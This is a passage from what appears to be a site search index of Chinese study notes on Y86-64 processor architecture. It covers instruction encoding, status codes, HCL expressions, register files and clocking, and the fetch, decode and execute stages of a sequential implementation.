\u200b\u65e0\u200b\u5bc4\u5b58\u5668\u200b\u6307\u793a\u200b\u7b26\u200b. \u200b\u4ece\u6808\u200b\u4e2d\u200b\u8bfb\u51fa\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b, \u200b\u51fa\u6808\u200b\u5e76\u200b\u8fd4\u56de\u200b.</li> <li>pushq: \u200b\u5c06\u200b rA \u200b\u4e2d\u200b\u7684\u200b\u5185\u5bb9\u200b\u5165\u6808\u200b. rB=F</li> <li>popq: \u200b\u5c06\u200b rA \u200b\u4e2d\u200b\u7684\u200b\u5185\u5bb9\u200b\u5165\u6808\u200b. rB=F</li> </ul>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#413","title":"4.1.3 \u200b\u6307\u4ee4\u200b\u7f16\u7801","text":"<p>OP \u200b\u4e2d\u200b\u7684\u200b ifun:</p> <ul> <li>0: addq</li> <li>1: subq</li> <li>2: andq</li> <li>3: xorq</li> </ul> <p>\u200b\u6761\u4ef6\u200b\u4f20\u9001\u200b\u548c\u200b\u8df3\u8f6c\u200b\u4e2d\u200b\u7684\u200b ifun:</p> <ul> <li>0: \u200b\u65e0\u6761\u4ef6\u200b</li> <li>1: \u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b (le)</li> <li>2: \u200b\u5c0f\u4e8e\u200b (l)</li> <li>3: \u200b\u7b49\u4e8e\u200b (e)</li> <li>4: \u200b\u4e0d\u200b\u7b49\u4e8e\u200b (ne)</li> <li>5: \u200b\u5927\u4e8e\u200b\u7b49\u4e8e\u200b (ge)</li> <li>6: \u200b\u5927\u4e8e\u200b (g)</li> </ul> <p>\u200b\u6ce8\u610f\u200b\u6761\u4ef6\u200b\u4e2d\u52a0\u200b\u8d77\u6765\u200b\u662f\u200b 7 \u200b\u7684\u200b\u521a\u597d\u200b\u662f\u200b\u76f8\u4e92\u200b\u53d6\u53cd\u200b. \u200b\u6bd4\u5982\u200b 1 \u200b\u662f\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b, 6 \u200b\u5c31\u662f\u200b\u4e0d\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b\u5373\u200b\u5927\u4e8e\u200b.</p> <p>\u200b\u5bc4\u5b58\u5668\u200b\u6807\u8bc6\u7b26\u200b\u5bf9\u5e94\u200b: </p> <p>\u200b\u8bb0\u5fc6\u200b\u65b9\u6cd5\u200b: </p> <ul> <li>8-F \u200b\u521a\u597d\u200b\u5bf9\u5e94\u200b r8-\u200b\u65e0\u200b\u5bc4\u5b58\u5668\u200b(\u200b\u539f\u6765\u200b\u7684\u200b r15)</li> <li>0-7 \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u672b\u5c3e\u200b\u6309\u7167\u200b\u5b57\u5178\u200b\u5e8f\u200b\u9006\u5e8f\u200b\u6392\u5217\u200b, x-&gt;p-&gt;i.</li> <li>x \u200b\u7684\u200b\u4e2d\u95f4\u200b\u5b57\u6bcd\u200b\u662f\u200b acdb, p \u200b\u7684\u200b\u4e2d\u95f4\u200b\u5b57\u6bcd\u200b\u662f\u200b sb, i \u200b\u7684\u200b\u4e2d\u95f4\u200b\u5b57\u6bcd\u200b\u662f\u200b sd.</li> </ul> <p>\u200b\u6240\u6709\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u548c\u200b\u8c03\u7528\u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u7684\u200b\u90fd\u200b\u662f\u200b\u7edd\u5bf9\u200b\u5730\u5740\u200b, \u200b\u6574\u6570\u200b\u91c7\u7528\u200b\u5c0f\u7aef\u6cd5\u200b\u7f16\u7801\u200b, \u200b\u5f53\u200b\u6307\u4ee4\u200b\u4e66\u5199\u200b\u65f6\u200b, \u200b\u7acb\u5373\u200b\u6570\u200b\u7684\u200b\u5b57\u8282\u200b\u8981\u200b\u4ee5\u200b\u76f8\u53cd\u200b\u7684\u200b\u987a\u5e8f\u200b\u51fa\u73b0\u200b</p> <p>CISC vs \u200b\u65e9\u671f\u200b RISC</p> <ul> <li>\u200b\u6307\u4ee4\u200b\u6570\u91cf\u200b: CISC \u200b\u8f83\u200b\u591a\u200b</li> <li>\u200b\u6307\u4ee4\u200b\u5ef6\u8fdf\u200b: CISC \u200b\u8f83\u957f\u200b</li> <li>\u200b\u7f16\u7801\u200b: CISC \u200b\u53ef\u53d8\u200b\u957f\u5ea6\u200b\u7f16\u7801\u200b, 1-15\u200b\u5b57\u8282\u200b. RISC \u200b\u56fa\u5b9a\u200b\u957f\u5ea6\u200b\u7f16\u7801\u200b, \u200b\u901a\u5e38\u200b\u90fd\u200b\u7f16\u7801\u200b\u4e3a\u200b 4 \u200b\u5b57\u8282\u200b</li> <li>\u200b\u5bfb\u5740\u200b: CISC \u200b\u6709\u200b\u53d8\u5740\u200b\u5bc4\u5b58\u5668\u200b\u548c\u200b\u4f38\u7f29\u200b\u56e0\u5b50\u200b, RISC \u200b\u53ea\u6709\u200b\u57fa\u5740\u200b\u548c\u200b\u504f\u79fb\u91cf\u200b\u5bfb\u5740\u200b</li> <li>\u200b\u5185\u5b58\u200b\u4e0e\u200b\u5bc4\u5b58\u5668\u200b: RISC \u200b\u53ea\u80fd\u200b\u5bf9\u200b\u5bc4\u5b58\u5668\u200b\u8fdb\u884c\u200b\u7b97\u672f\u200b\u548c\u200b\u903b\u8f91\u8fd0\u7b97\u200b, \u200b\u5141\u8bb8\u200b\u4f7f\u7528\u200b\u5185\u5b58\u200b\u7684\u200b\u53ea\u6709\u200b load/store, \u200b\u56e0\u6b64\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b load/store \u200b\u4f53\u7cfb\u7ed3\u6784\u200b</li> <li>\u200b\u53ef\u89c1\u200b\u6027\u200b: CISC \u200b\u5bf9\u200b\u673a\u5668\u200b\u7ea7\u200b\u7a0b\u5e8f\u200b\u6765\u8bf4\u200b\u5b9e\u73b0\u200b\u7ec6\u8282\u200b\u4e0d\u200b\u53ef\u89c1\u200b, RIS \u200b\u53ef\u89c1\u200b.</li> <li>\u200b\u6761\u4ef6\u200b\u7801\u200b: CISC \u200b\u6709\u200b\u6761\u4ef6\u200b\u7801\u200b, RISC \u200b\u65e0\u6761\u4ef6\u200b\u7801\u200b</li> <li>\u200b\u5bc6\u96c6\u200b: CISC \u200b\u6808\u200b\u5bc6\u96c6\u200b, RISC \u200b\u5bc4\u5b58\u5668\u200b\u5bc6\u96c6\u200b, \u200b\u56e0\u6b64\u200b RISC \u200b\u901a\u5e38\u200b\u6709\u200b\u66f4\u200b\u591a\u200b\u5bc4\u5b58\u5668\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#414-y86-64","title":"4.1.4 Y86-64 \u200b\u5f02\u5e38","text":"<p>\u200b\u72b6\u6001\u200b\u7801\u200b Stat \u200b\u63cf\u8ff0\u200b\u4e86\u200b\u7a0b\u5e8f\u8fd0\u884c\u200b\u7684\u200b\u603b\u4f53\u200b\u72b6\u6001\u200b. - Stat=1: AOK (ALL OK) \u200b\u6b63\u5e38\u200b\u64cd\u4f5c\u200b - Stat=2: HLT (Halt) \u200b\u9047\u5230\u200b halt \u200b\u6307\u4ee4\u200b - Stat=3: ADR (Address) \u200b\u9047\u5230\u200b\u975e\u6cd5\u200b\u5730\u5740\u200b - Stat=4: INS (Instruction) \u200b\u9047\u5230\u200b\u975e\u6cd5\u200b\u6307\u4ee4\u200b</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#415-y86-64","title":"4.1.5 Y86-64 \u200b\u7a0b\u5e8f","text":"<p>Y86-64 \u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b\u5b8c\u6574\u200b\u7a0b\u5e8f\u200b\u5b9e\u4f8b\u200b: </p> <p>\u200b\u4ee5\u200b . \u200b\u5f00\u5934\u200b\u7684\u200b\u662f\u200b\u6c47\u7f16\u5668\u200b\u4f2a\u6307\u4ee4\u200b, \u200b\u544a\u8bc9\u200b\u6c47\u7f16\u5668\u200b\u8c03\u6574\u200b\u5730\u5740\u200b. \u200b\u6bd4\u5982\u200b .pos 0x200 \u200b\u544a\u8bc9\u200b\u6c47\u7f16\u5668\u200b\u4ece\u200b 0x200 \u200b\u5730\u5740\u200b\u5f00\u59cb\u200b\u4ee5\u4fbf\u200b\u63d2\u5165\u200b\u6570\u636e\u200b\u6216\u200b\u4ee3\u7801\u200b. \u200b\u6ce8\u610f\u200b\u5982\u679c\u200b\u662f\u200b\u5728\u200b\u673a\u5668\u200b\u4ee3\u7801\u200b\u4e2d\u200b, array \u200b\u91cc\u9762\u200b\u7684\u200b\u5143\u7d20\u200b\u4e5f\u200b\u662f\u200b\u6309\u200b\u5c0f\u7aef\u6cd5\u200b\u4e66\u5199\u200b\u7684\u200b.</p> <p>pushq %rsp \u200b\u548c\u200b popq %rsp</p> <p>pushq %rsp \u200b\u4f1a\u200b\u5c06\u200b rsp \u200b\u7684\u200b\u539f\u59cb\u200b\u503c\u200b\u5b58\u5165\u200b\u6808\u4e2d\u200b, \u200b\u518d\u200b\u5c06\u200b rsp-8. popq %rsp \u200b\u4f1a\u4ee4\u200b rsp = \u200b\u6808\u9876\u200b\u5143\u7d20\u200b, \u200b\u5e76\u4e14\u200b\u4e0d\u518d\u200b +8.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#42-hcl","title":"4.2 HCL","text":""},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#421","title":"4.2.1 \u200b\u7ec4\u5408\u200b\u7535\u8def","text":"<p>\u200b\u903b\u8f91\u200b\u95e8\u200b: AND\u200b\u95e8\u200b, OR \u200b\u95e8\u200b, NOT \u200b\u95e8\u200b</p> <p>\u200b\u903b\u8f91\u200b\u95e8\u200b\u53ea\u200b\u5bf9\u200b\u5355\u4e2a\u200b\u4f4d\u200b\u7684\u200b\u6570\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b, \u200b\u800c\u200b\u4e0d\u662f\u200b\u6574\u4e2a\u200b\u5b57\u200b.</p> <p>HCL \u200b\u4e2d\u200b, bool \u200b\u8868\u793a\u200b\u4e00\u4f4d\u200b\u6570\u636e\u200b, \u200b\u6240\u6709\u200b\u5b57\u7ea7\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u58f0\u660e\u200b\u4e3a\u200b int \u200b\u800c\u200b\u4e0d\u200b\u6307\u5b9a\u200b\u5b57\u200b\u5927\u5c0f\u200b.</p> <p>\u200b\u7ec4\u5408\u200b\u903b\u8f91\u7535\u8def\u200b\u8868\u8fbe\u5f0f\u200b  Terraform<pre><code>bool eq = (expr);\n</code></pre></p> <p>\u200b\u9009\u62e9\u200b\u8868\u8fbe\u5f0f\u200b:  Terraform<pre><code>[\n    select1 : expr1;\n    select2 : expr2;\n    ...\n    selectk : exprk;\n]\n</code></pre> \u200b\u6bcf\u79cd\u200b\u60c5\u51b5\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5e03\u5c14\u200b\u8868\u8fbe\u5f0f\u200b select_i \u200b\u548c\u200b\u6574\u6570\u200b\u8868\u8fbe\u5f0f\u200b expr_i, \u200b\u7b2c\u4e00\u4e2a\u200b\u6c42\u503c\u200b\u4e3a\u200b 1 \u200b\u7684\u200b\u60c5\u51b5\u200b\u4f1a\u200b\u88ab\u200b\u9009\u4e2d\u200b. \u200b\u56e0\u6b64\u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b\u60c5\u51b5\u200b\u8868\u8fbe\u5f0f\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b select \u200b\u90fd\u200b\u662f\u200b 1, \u200b\u8868\u793a\u200b\u524d\u9762\u200b\u90fd\u200b\u672a\u200b\u53d1\u751f\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b.</p> <p>\u200b\u901a\u8fc7\u200b\u903b\u8f91\u200b\u95e8\u200b\u548c\u200b\u9009\u62e9\u200b\u8868\u8fbe\u5f0f\u200b\u7684\u200b\u7ec4\u5408\u200b, \u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b ALU. \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u8d85\u51fa\u200b\u4e86\u200b\u6211\u4eec\u200b\u7684\u200b\u8ba8\u8bba\u200b\u8303\u56f4\u200b.</p> <p></p> <p>\u200b\u96c6\u5408\u200b\u5173\u7cfb\u200b\u8868\u8fbe\u5f0f\u200b Terraform<pre><code>bool s = code in {1, 2}\n</code></pre> \u200b\u8fd9\u4e2a\u200b\u4ee3\u7801\u200b\u7684\u200b\u610f\u601d\u200b\u5c31\u662f\u200b <code>s = code == 1 || code == 2</code></p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#422","title":"4.2.2 \u200b\u5b58\u50a8\u5668\u200b\u548c\u200b\u65f6\u949f","text":"<p>\u200b\u7ec4\u5408\u200b\u7535\u8def\u200b\u672c\u8d28\u200b\u4e0a\u200b\u6765\u8bb2\u200b\u4e0d\u200b\u5b58\u50a8\u200b\u4efb\u4f55\u200b\u4fe1\u606f\u200b, \u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u53ea\u662f\u200b\u7b80\u5355\u200b\u5730\u200b\u54cd\u5e94\u200b\u8f93\u5165\u200b\u4fe1\u53f7\u200b, \u200b\u4ea7\u751f\u200b\u8f93\u51fa\u200b.</p> <p>\u200b\u4e3a\u4e86\u200b\u4ea7\u751f\u200b\u65f6\u5e8f\u7535\u8def\u200b, \u200b\u6211\u4eec\u200b\u5fc5\u987b\u200b\u5f15\u5165\u200b\u6309\u4f4d\u200b\u5b58\u50a8\u200b\u4fe1\u606f\u200b\u7684\u200b\u8bbe\u5907\u200b, \u200b\u5b83\u4eec\u200b\u90fd\u200b\u662f\u200b\u7531\u200b\u540c\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u63a7\u5236\u200b\u7684\u200b, \u200b\u65f6\u949f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5468\u671f\u6027\u200b\u4fe1\u53f7\u200b, \u200b\u51b3\u5b9a\u200b\u4ec0\u4e48\u200b\u65f6\u5019\u200b\u628a\u200b\u65b0\u503c\u200b\u52a0\u8f7d\u200b\u5230\u200b\u8bbe\u5907\u200b\u4e2d\u200b, \u200b\u6709\u200b\u4e24\u7c7b\u200b\u5b58\u50a8\u8bbe\u5907\u200b: - \u200b\u65f6\u949f\u200b\u5bc4\u5b58\u5668\u200b(\u200b\u7b80\u79f0\u200b\u5bc4\u5b58\u5668\u200b)\u200b\u5b58\u50a8\u200b\u5355\u4e2a\u200b\u4f4d\u200b\u6216\u8005\u200b\u5b57\u200b. - \u200b\u968f\u673a\u200b\u8bbf\u95ee\u200b\u5b58\u50a8\u5668\u200b(\u200b\u7b80\u79f0\u200b\u5185\u5b58\u200b)\u200b\u5b58\u50a8\u200b\u591a\u4e2a\u200b\u5b57\u200b. \u200b\u7528\u200b\u5730\u5740\u200b\u6765\u200b\u9009\u62e9\u200b\u8be5\u8bfb\u200b\u54ea\u4e2a\u200b\u5b57\u200b. \u200b\u8fd9\u91cc\u200b\u5305\u62ec\u200b 1) \u200b\u5904\u7406\u5668\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u7cfb\u7edf\u200b.(\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u4e00\u4e2a\u200b\u5de8\u5927\u200b\u5b57\u8282\u200b\u6570\u7ec4\u200b) 2) \u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b (\u200b\u6807\u53f7\u200b0-14), \u200b\u7528\u200b rA rB \u200b\u4f5c\u4e3a\u200b\u5730\u5740\u200b\u8bbf\u95ee\u200b.</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u786c\u4ef6\u200b\u548c\u200b\u673a\u5668\u200b\u7ea7\u200b\u7f16\u7a0b\u200b\u7684\u200b\"\u200b\u5bc4\u5b58\u5668\u200b\"\u200b\u662f\u200b\u6709\u200b\u7ec6\u5fae\u5dee\u522b\u200b\u7684\u200b. \u200b\u786c\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u6210\u53ea\u200b\u5b58\u50a8\u200b\u4e00\u4e2a\u200b\u4fe1\u606f\u200b(\u200b\u76f4\u63a5\u200b\u628a\u200b\u8f93\u5165\u200b\u548c\u200b\u8f93\u51fa\u200b\u8fde\u63a5\u200b\u5230\u200b\u5176\u4ed6\u200b\u5730\u65b9\u200b). \u200b\u673a\u5668\u200b\u7ea7\u200b\u5bc4\u5b58\u5668\u200b\u662f\u200b\u5b58\u653e\u200b\u5728\u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b. \u200b\u4e3a\u4e86\u200b\u533a\u5206\u200b\u6211\u4eec\u200b\u79f0\u200b\u4ed6\u4eec\u200b\u4e3a\u200b \u200b\u786c\u4ef6\u200b\u5bc4\u5b58\u5668\u200b \u200b\u548c\u200b \u200b\u7a0b\u5e8f\u200b\u5bc4\u5b58\u5668\u200b.</p> <p>\u200b\u4e00\u4e9b\u200b\u5355\u72ec\u200b\u7684\u200b\u4fe1\u606f\u200b\u6bd4\u5982\u200b\u72b6\u6001\u200b\u7801\u200b, PC, \u200b\u6761\u4ef6\u200b\u7801\u200b\u5c31\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u786c\u4ef6\u200b\u5bc4\u5b58\u5668\u200b\u6765\u200b\u5b58\u50a8\u200b. \u200b\u4e00\u4e9b\u200b\u591a\u4e2a\u200b\u4fe1\u606f\u200b\u7684\u200b\u805a\u5408\u200b\u6bd4\u5982\u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u5c31\u4f1a\u7528\u200b\u968f\u673a\u200b\u8bbf\u95ee\u200b\u5b58\u50a8\u5668\u200b\u6765\u200b\u5b58\u50a8\u200b. </p> <p>\u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u6709\u200b\u4e24\u4e2a\u200b\u8bfb\u200b\u7aef\u53e3\u200b, \u200b\u4e00\u4e2a\u200b\u5199\u200b\u7aef\u53e3\u200b. srcA, srcB \u200b\u6307\u660e\u200b\u8981\u8bfb\u200b\u54ea\u4e2a\u200b\u5bc4\u5b58\u5668\u200b, valA, valB \u200b\u662f\u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u503c\u200b. dstW, valW \u200b\u5206\u522b\u200b\u4ee3\u8868\u200b\u8981\u200b\u5199\u200b\u54ea\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u548c\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b.</p> <p>\u200b\u8bfb\u200b\u662f\u200b\u4e0d\u200b\u9700\u8981\u200b\u65f6\u949f\u200b\u7684\u200b, \u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7ec4\u5408\u200b\u7535\u8def\u200b, \u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u54cd\u5e94\u200b srcA, srcB \u200b\u7684\u200b\u8f93\u5165\u200b\u5e76\u200b\u8f93\u51fa\u200b valA, valB. \u200b\u53ef\u80fd\u200b\u4e00\u200b\u5f00\u59cb\u200b\u7684\u200b\u4fe1\u53f7\u200b\u5e76\u200b\u4e0d\u200b\u7a33\u5b9a\u200b, \u200b\u4f46\u200b\u7ecf\u8fc7\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u540e\u200b\u8f93\u51fa\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u7a33\u5b9a\u4e0b\u6765\u200b. </p> <p>\u200b\u5199\u200b\u662f\u200b\u9700\u8981\u200b\u65f6\u949f\u200b\u7684\u200b, \u200b\u56e0\u4e3a\u200b\u7535\u8def\u200b\u7684\u200b\u4fe1\u606f\u200b\u4e00\u76f4\u200b\u5728\u200b\u53d8\u5316\u200b, \u200b\u6211\u4eec\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u5728\u200b\u8fd8\u200b\u672a\u200b\u7a33\u5b9a\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u5199\u5165\u200b\u4fe1\u606f\u200b(\u200b\u6bd4\u5982\u8bf4\u200b\u53ef\u80fd\u200b\u7531\u4e8e\u200b\u7535\u8def\u200b\u8fd8\u200b\u672a\u200b\u7a33\u5b9a\u200b dstW \u200b\u4e00\u200b\u5f00\u59cb\u200b\u8fd8\u662f\u200b\u4e00\u4e2a\u200b\u5947\u602a\u200b\u7684\u200b\u503c\u200b), \u200b\u8fd9\u6837\u200b\u4f1a\u200b\u7834\u574f\u200b\u6570\u636e\u200b. \u200b\u901a\u8fc7\u200b\u5728\u200b\u65f6\u949f\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u5199\u5165\u200b\u6211\u4eec\u200b\u4fdd\u8bc1\u200b\u5199\u5165\u200b\u7684\u200b\u4fe1\u53f7\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7a33\u5b9a\u200b\u7684\u200b\u4fe1\u53f7\u200b. \u200b\u8fd9\u6837\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u7834\u574f\u200b\u6570\u636e\u200b\u4e86\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#43-y86-64","title":"4.3 Y86-64 \u200b\u7684\u200b\u987a\u5e8f\u200b\u5b9e\u73b0","text":"<p>\u200b\u6309\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b, \u200b\u662f\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b\u7684\u200b\u7b2c\u4e00\u6b65\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#431","title":"4.3.1 \u200b\u5c06\u200b\u5904\u7406\u200b\u7ec4\u7ec7\u200b\u6210\u200b\u9636\u6bb5","text":"<p>\u200b\u5904\u7406\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5305\u542b\u200b\u5f88\u591a\u200b\u64cd\u4f5c\u200b, \u200b\u6211\u4eec\u200b\u5c06\u200b\u5b83\u4eec\u200b\u5212\u5206\u200b\u4e3a\u200b\u7edf\u4e00\u200b\u7684\u200b\u51e0\u4e2a\u200b\u9636\u6bb5\u200b. - \u200b\u53d6\u6307\u200b (fetch): \u200b\u4ece\u200b\u5185\u5b58\u5730\u5740\u200b\u4e3a\u200bPC\u200b\u5904\u200b\u8bfb\u53d6\u200b\u6307\u4ee4\u200b\u5b57\u8282\u200b, \u200b\u5f97\u5230\u200b icode, ifun. \u200b\u5982\u679c\u200b\u9700\u8981\u200b\u53ef\u80fd\u200b\u8fd8\u4f1a\u200b\u8bfb\u51fa\u200b\u5bc4\u5b58\u5668\u200b\u6307\u793a\u200b\u7b26\u200b\u5b57\u8282\u200b rA|rB. \u200b\u5e38\u200b\u6570\u5b57\u200b valC. \u200b\u8bfb\u53d6\u200b\u540e\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b valP. valP = PC + \u200b\u5f53\u524d\u200b\u6307\u4ee4\u200b\u7684\u200b\u957f\u5ea6\u200b - \u200b\u8bd1\u7801\u200b (decode): \u200b\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u8bfb\u5165\u200b\u6700\u200b\u591a\u200b\u4e24\u4e2a\u200b\u64cd\u4f5c\u6570\u200b, \u200b\u5f97\u5230\u200b valA\u200b\u548c\u200b/\u200b\u6216\u200b valB. \u200b\u901a\u5e38\u200b\u662f\u200b\u8bfb\u5165\u200b rA, rB \u200b\u6307\u660e\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b, \u200b\u4e0d\u8fc7\u200b\u6709\u65f6\u5019\u200b\u8bfb\u200b\u5bc4\u5b58\u5668\u200b %rsp (4) - \u200b\u6267\u884c\u200b (execute): ALU \u200b\u8981\u4e48\u200b\u6267\u884c\u200b\u6307\u4ee4\u200b\u6307\u660e\u200b\u7684\u200b\u64cd\u4f5c\u200b, \u200b\u8981\u4e48\u200b\u589e\u52a0\u200b\u548c\u200b\u51cf\u5c11\u200b\u6808\u200b\u6307\u9488\u200b. \u200b\u5f97\u5230\u200b\u7684\u200b\u503c\u200b\u79f0\u4e3a\u200b valE. \u200b\u5728\u200b\u8fd9\u91cc\u200b\u53ef\u80fd\u200b\u8bbe\u7f6e\u200b\u6761\u4ef6\u200b\u7801\u200b. \u200b\u5bf9\u200b\u6761\u4ef6\u200b\u4f20\u9001\u200b\u6307\u4ee4\u200b, \u200b\u4f1a\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u9636\u6bb5\u200b\u68c0\u67e5\u200b\u6761\u4ef6\u200b\u7801\u200b\u548c\u200b\u4f20\u9001\u200b\u6761\u4ef6\u200b. \u200b\u540c\u6837\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u662f\u5426\u200b\u8df3\u8f6c\u200b\u4e5f\u200b\u662f\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u9636\u6bb5\u200b\u68c0\u67e5\u200b. - \u200b\u8bbf\u5b58\u200b (memory): \u200b\u53ef\u4ee5\u200b\u5c06\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b, \u200b\u6216\u8005\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u51fa\u200b\u6570\u636e\u200b. \u200b\u8bfb\u51fa\u200b\u7684\u200b\u503c\u200b\u79f0\u4e3a\u200b valM. - \u200b\u5199\u56de\u200b (write back): \u200b\u6700\u200b\u591a\u200b\u53ef\u4ee5\u200b\u5199\u200b\u4e24\u4e2a\u200b\u7ed3\u679c\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b. - \u200b\u66f4\u65b0\u200bPC (PC update): \u200b\u5c06\u200b PC \u200b\u8bbe\u7f6e\u200b\u6210\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b.</p> <p></p> <p>Warning</p> <p>ALU \u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u8f93\u5165\u200b\u548c\u200b\u7b2c\u4e8c\u4e2a\u200b\u8f93\u5165\u200b\u6700\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b \u200b\u7b2c\u4e8c\u4e2a\u200b\u8f93\u5165\u200b OP \u200b\u7b2c\u4e00\u4e2a\u200b\u8f93\u5165\u200b. \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u4e66\u5199\u200b\u7684\u200b\u65f6\u5019\u200b\u5c06\u200b valB \u200b\u5199\u200b\u5728\u200b\u524d\u9762\u200b</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u5bf9\u200b\u5185\u5b58\u200b\u7684\u200b\u64cd\u4f5c\u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u90fd\u200b\u5728\u200b\u6267\u884c\u200b\u9636\u6bb5\u200b\u7b97\u200b\u51fa\u200b\u5185\u5b58\u5730\u5740\u200b valE. \u200b\u5728\u200b\u8bbf\u5b58\u200b\u9636\u6bb5\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b valE \u200b\u5904\u200b\u7684\u200b\u5185\u5bb9\u200b.</p> <p></p> <p>(\u200b\u8fd9\u91cc\u200b\u4e66\u4e0a\u200b popq \u200b\u8bbf\u5b58\u200b\u9636\u6bb5\u200b valM&lt;-M_8[valA] \u200b\u53c8\u200b\u5199\u6210\u200b valE \u200b\u4e86\u200b...)</p> <p>\u200b\u6ce8\u610f\u200b, \u200b\u5728\u200b\u8fd9\u91cc\u200b\u5bf9\u6808\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e2d\u200b, \u200b\u8bd1\u7801\u200b\u9636\u6bb5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bfb\u200b %rsp \u200b\u5904\u200b\u7684\u200b\u5185\u5bb9\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u6267\u884c\u200b\u9636\u6bb5\u200b\u8ba1\u7b97\u200b\u51fa\u6808\u200b\u5730\u5740\u200b.</p> <p>\u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u90fd\u200b\u662f\u200b\u5bf9\u200b valB \u200b\u6765\u200b\u4f5c\u4e3a\u200b\u5730\u5740\u200b\u504f\u79fb\u200b\u7684\u200b\u57fa\u5740\u200b, \u200b\u6240\u4ee5\u200b valB \u200b\u80af\u5b9a\u200b\u662f\u200b\u8bfb\u200b %rsp \u200b\u7684\u200b\u5185\u5bb9\u200b, \u200b\u6ce8\u610f\u200b\u5728\u200b popq \u200b\u7684\u200b\u6307\u4ee4\u200b\u4e2d\u200b, \u200b\u6211\u4eec\u200b\u8981\u8bfb\u200b\u4e24\u904d\u200b rsp \u200b\u7684\u200b\u5185\u5bb9\u200b. \u200b\u56e0\u4e3a\u200b\u5728\u200b\u8bbf\u5b58\u200b\u7684\u200b\u9636\u6bb5\u200b\u6211\u4eec\u200b\u8981\u8bfb\u200b\u7684\u200b\u662f\u200b\u8fd8\u200b\u672a\u200b +8 \u200b\u7684\u200b %rsp \u200b\u7684\u200b\u5185\u5bb9\u200b. \u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u200b\u7ee7\u7eed\u200b\u4f7f\u7528\u200b valB? \u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u517c\u5bb9\u200b\u5427\u200b.</p> 